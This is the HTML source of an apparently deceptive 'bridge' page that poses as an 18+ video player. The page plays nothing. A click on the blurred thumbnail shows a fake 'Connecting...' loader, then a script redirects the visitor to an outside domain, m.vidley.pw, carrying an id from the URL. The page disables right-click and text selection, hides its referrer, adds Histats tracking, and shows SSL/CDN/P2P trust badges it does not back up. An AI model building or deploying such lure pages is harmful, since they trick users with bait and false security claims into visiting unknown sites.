<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Stream Portal | Secure Access</title>
    
    <meta property="og:title" content="Private Video Access" />
    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
    <meta property="og:type" content="website" />

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        
        body { 
            background-color: #030303; 
            color: #ffffff; 
            font-family: 'Inter', sans-serif;
            user-select: none; 
            -webkit-user-select: none; 
            touch-action: manipulation;
            overflow-x: hidden;
        }
        
        .glass {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .pulse-red {
            animation: pulse-red-glow 2s infinite;
        }
        @keyframes pulse-red-glow {
            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
            50% { box-shadow: 0 0 40px 15px rgba(220, 38, 38, 0.4); transform: scale(1.08); }
            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
        }

        .click-effect:active {
            transform: scale(0.94);
            transition: transform 0.1s;
        }

        .age-badge {
            border: 1.5px solid #dc2626;
            color: #dc2626;
            padding: 2px 8px;
            border-radius: 4px;
            font-weight: 800;
            font-size: 14px;
            letter-spacing: 1px;
        }

        ::-webkit-scrollbar { display: none; }
        
        .spinner-ring {
            border: 3px solid rgba(220, 38, 38, 0.1);
            border-top: 3px solid #dc2626;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Container Utama -->
    <div class="w-full max-w-[380px] glass rounded-[3rem] overflow-hidden relative shadow-[0_50px_100px_-20px_rgba(0,0,0,1)] transition-all duration-500">
        
        <div id="videoArea" class="relative w-full h-[520px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group click-effect">
            
            <!-- Video Blur Background -->
            <img id="vidThumb" class="absolute inset-0 w-full h-full object-cover opacity-40 blur-[25px] scale-110 transition-all duration-1000" src="https://vidley.pw/tombolplay.jpg" alt="Preview">

            <!-- Overlay Konten -->
            <div id="playOverlay" class="relative z-20 flex flex-col items-center justify-center transition-opacity duration-300">
                
                <!-- Label Usia -->
                <div class="mb-12 flex flex-col items-center opacity-80">
                     <span class="age-badge mb-2">18+</span>
                     <p class="text-white/40 text-[9px] uppercase tracking-[0.3em] font-bold">Adult Only Content</p>
                </div>

                <!-- Tombol Play Central -->
                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_50px_rgba(220,38,38,0.5)] pulse-red transition-transform duration-500 group-hover:scale-110">
                    <i data-lucide="play" class="w-10 h-10 text-white fill-current ml-1"></i>
                </div>
            </div>
            
            <!-- Loader UI -->
            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#030303]/95 z-40 backdrop-blur-2xl">
                <div class="flex flex-col items-center">
                    <div class="spinner-ring mb-6"></div>
                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.4em] uppercase italic animate-pulse">Connecting...</span>
                </div>
            </div>
        </div>

        <!-- Footer Minimalis -->
        <div class="py-6 bg-[#070709]/80 flex flex-col items-center border-t border-white/5">
            <div class="flex justify-center gap-6 text-white/20 text-[9px] font-bold uppercase tracking-[0.2em]">
                <span class="flex items-center gap-1"><i data-lucide="shield" class="w-3 h-3"></i> SSL</span>
                <span class="flex items-center gap-1"><i data-lucide="zap" class="w-3 h-3"></i> CDN</span>
                <span class="flex items-center gap-1"><i data-lucide="lock" class="w-3 h-3"></i> P2P</span>
            </div>
        </div>
    </div>

    <script>
        lucide.createIcons();

        const MAIN_URL = "https://m.vidley.pw"; 

        function getVideoId() {
            let path = window.location.pathname.split('/').pop().trim();
            if (!path || path === "" || path === "index.html" || path === "bridge.html") {
                const urlParams = new URLSearchParams(window.location.search);
                path = urlParams.get('id') || urlParams.get('v');
            }
            if (path && path.length >= 3 && !path.includes('.html')) {
                return path;
            }
            return null;
        }

        async function _trigger() {
            const l = document.getElementById("loader");
            const po = document.getElementById("playOverlay");
            const vId = getVideoId();

            l.classList.remove('hidden');
            po.style.opacity = "0";

            // Redireksi cepat (Jeda 1 detik)
            setTimeout(() => {
                let finalTarget = MAIN_URL;
                if (vId) {
                    finalTarget = MAIN_URL.endsWith('/') ? MAIN_URL + vId : MAIN_URL + '/' + vId;
                }
                window.location.href = finalTarget;
            }, 1000);
        }

        document.getElementById("videoArea").addEventListener("click", _trigger);
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>

    <!-- Histats Tracking -->
    <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,4889367,4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
            hs.src = ('//s10.histats.com/js15_as.js');
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
    </script>
    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4889367&101" alt="stats" border="0"></a></noscript>

</body>
</html>
